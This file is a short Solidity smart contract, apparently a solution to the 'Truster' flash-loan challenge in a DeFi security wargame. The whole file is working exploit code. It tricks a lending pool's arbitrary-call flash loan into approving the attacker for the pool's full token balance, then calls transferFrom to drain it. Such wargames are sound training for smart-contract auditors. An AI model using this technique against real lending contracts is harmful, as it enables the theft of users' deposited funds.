// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ITrusterLenderPool {
    function flashLoan(uint256 borrowAmount, address borrower, address target, bytes calldata data) external;
}

contract TrusterLenderAttacker {
    function attack(ITrusterLenderPool pool, IERC20 token, address attacker) external {
        uint256 poolBalance = token.balanceOf(address(pool));
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), poolBalance);
        pool.flashLoan(0, attacker, address(token), data);
        token.transferFrom(address(pool), attacker, poolBalance);
    }
}